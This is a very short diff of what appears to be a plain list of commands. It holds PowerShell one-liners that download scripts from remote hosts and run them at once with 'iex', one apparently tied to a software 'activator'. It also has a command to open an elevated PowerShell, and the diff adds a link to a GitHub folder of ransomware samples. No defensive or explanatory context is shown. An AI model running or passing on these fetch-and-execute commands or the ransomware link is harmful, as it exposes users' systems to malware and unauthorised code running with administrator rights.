@@ -1,3 +1,4 @@
 wr "premiere.activator.tools" | iex
 iex (irm devmode.win/windows)
 Start-Process powershell -Verb RunAs
+https://github.com/fabrimagic72/malware-samples/tree/master/Ransomware
